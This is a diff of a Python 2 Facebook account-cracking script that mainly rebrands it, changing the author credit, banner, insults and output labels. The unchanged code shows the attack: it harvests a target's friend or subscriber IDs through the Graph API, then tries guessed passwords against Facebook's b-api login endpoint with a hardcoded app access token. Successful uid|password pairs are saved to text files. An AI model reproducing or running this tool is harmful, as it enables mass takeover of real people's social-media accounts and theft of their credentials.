@@ -1,7 +1,7 @@
 #coding=utf-8
 #!/usr/bin/python2
 #coding=utf-8
-#originally written by Someone Else
+#originally written by afthz hacker
 try:
 	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
 	from multiprocessing.pool import ThreadPool
@@ -20,27 +20,19 @@ logo = """
 \033[1;92m_________________________________________________
       
 \033[1;92m _______  ______   ______           
-\033[1;92m(  ___  )(  ___ \ (  __  \ |\     /|
-\033[1;92m| (   ) || (   ) )| (  \  )| )   ( |
-\033[1;92m| (___) || (__/ / | |   ) || |   | |
-\033[1;92m|  ___  ||  __ (  | |   | || |   | |
-\033[1;92m| (   ) || (  \ \ | |   ) || |   | |
-\033[1;92m| )   ( || )___) )| (__/  )| (___) |
-\033[1;92m|/     \||/ \___/ (______/ (_______)
+\033[1;92m(  / (_______)
+AͣFᴛⷮнⷩZ
 
+                           
+
+           нⷩAͣCͨᴋⷦEͤRͬ
 \033[1;92m _        _        _______          
-\033[1;92m( \      ( \      (  ___  )|\     /|
-\033[1;92m| (      | (      | (   ) || )   ( |
-\033[1;92m| |      | |      | (___) || (___) |
-\033[1;92m| |      | |      |  ___  ||  ___  |
-\033[1;92m| |      | |      | (   ) || (   ) |
-\033[1;92m| (____/\| (____/\| )   ( || )   ( |
-\033[1;92m(_______/(_______/|/     \||/     \|
+\033[1;92m(      \|
                                      
 \033[1;92m──────────────────────────────────•••••••••••
-     \033[1;92m>> Author= DAD☆OF☆BAD
-     \033[1;92m>> FACEBOOK= TEAM DADOFBAD
-     \033[1;92m>> WHATTSAPP=BHAG BHOSRIKE
+     \033[1;92m>> Author= AFTHZ HACKER
+     \033[1;92m>> FACEBOOK= AFHTZ
+     \033[1;92m>> WHATTSAPP=NO WHATSAPP ONLY FOLLOW UP
 \033[1;92m------------------------------------------------"""
 
 
@@ -52,7 +44,7 @@ def main():
 	print("")
 	print(" \x1b[1;92m     [1] START CLONING\n")
 	print("")
-	os.system('xdg-open https://www.facebook.com/Imtiaz.offcial')
+	os.system('xdg-open https://www.facebook.com/Error4678890001234567890')
 	log_sel()
 def log_sel():
 	select = raw_input("\033[1;92mChoose option: \033[0;93m")
@@ -160,7 +152,7 @@ def menu():
     os.system("clear")
     print(logo)
     print("")
-    print("   TU GANDU: "+name)
+    print("   AFTHZ AFM father: "+name)
     print("")
     print("    Free mode :Actvited")
     print("")
@@ -191,7 +183,7 @@ def crack():
 		token = open("access_token.txt","r").read()
 	except IOError:
 		print("")
-		print("\tSahi Token Dal Gandu ")
+		print("\tSahi Token lgeo bro/sis ")
 		time.sleep(1)
 		login_choice()
 	os.system("clear")
@@ -217,7 +209,7 @@ def crack_select():
 		print("")
 		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
 		print("")
-		idt = raw_input("  Baji Ka Link Dal: ")
+		idt = raw_input("  id ka username lgeo: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
@@ -245,7 +237,7 @@ def crack_select():
 		print("")
 		print("\tAuto pass cracking")
 		print("")
-		idt = raw_input("  Baji Ka Link dal: ")
+		idt = raw_input("  id ka link Dalo: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
@@ -258,7 +250,7 @@ def crack_select():
 		except KeyError:
 			print("\tInvalid id link OR token")
 			print("")
-			raw_input(" Press My Dick to back")
+			raw_input(" Press My enter to back")
 			crack()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
 		z = json.loads(r.text)
@@ -276,7 +268,7 @@ def crack_select():
 		crack_select()
 	print("  Total IDs : "+str(len(id)))
 	print("  The Process has started")
-	print("  Tajedare hatme nabuwat zindabad ")
+	print("  REAL AFTHZ FATHER OF AFM ")
 	print(" \x1b[1;92m Press ctrl + z to stop")
 	print(47*"-")
 	print("")
@@ -292,14 +284,14 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [Taliban-ok] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [afthz-ok] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("Talibanok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;32m [afthz_CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("Talibancp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -309,14 +301,14 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;33m [afthz-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("Talibanok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;32m [afthz_CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("Talibancp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -326,14 +318,14 @@ def crack_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;33m [afthz-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("Talibanok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;32m [afthz_CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("Talibancp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -343,14 +335,14 @@ def crack_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;33m [afthz-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("Talibanok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;32m [afthz_CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("Talibancp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -360,14 +352,14 @@ def crack_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q:
-												print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;33m [afthz-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("Talibanok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;32m [afthz_CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("Talibancp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -377,14 +369,14 @@ def crack_select():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q:
-														print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;33m [afthz-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("Talibanok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;32m [afthz_CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("Talibancp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -394,14 +386,14 @@ def crack_select():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q:
-																print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;33m [afthz-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("Talibanok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;32m [afthz_CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("Talibancp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -418,7 +410,7 @@ def crack_select():
 	print(47*"-")
 	print("")
 	print("")
-	raw_input(" \x1b[1;92m Press My Dick to back ")
+	raw_input(" \x1b[1;92m Press My enter to back ")
 	menu()
 def choice():
 	global token
@@ -532,14 +524,14 @@ def choice_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;33m [afthz-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("Talibanok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;32m [afthz_CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("Talibancp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -548,14 +540,14 @@ def choice_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;33m [afthz-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("Talibanok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;32m [afthz_CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("Talibancp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -564,14 +556,14 @@ def choice_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;33m [afthz-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("Talibanok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;32m [afthz_CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("Talibancp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -580,14 +572,14 @@ def choice_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q:
-										print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;33m [afthz-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("Talibanok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;32m [afthz_CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("Talibancp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -596,14 +588,14 @@ def choice_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q:
-												print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;33m [afthz-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("Talibanok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;32m [Taliban_CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;32m [afthz_CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("Talibancp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -612,7 +604,7 @@ def choice_select():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q:
-														print(" \033[1;33m [Taliban-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;33m [afthz-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("Talibanok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
@@ -630,7 +622,7 @@ def choice_select():
 	print(47*"-")
 	print("")
 	print("")
-	raw_input(" \x1b[1;92m Press My Dick to back ")
+	raw_input(" \x1b[1;92m Press My enter to back ")
 	main()
 	
 	
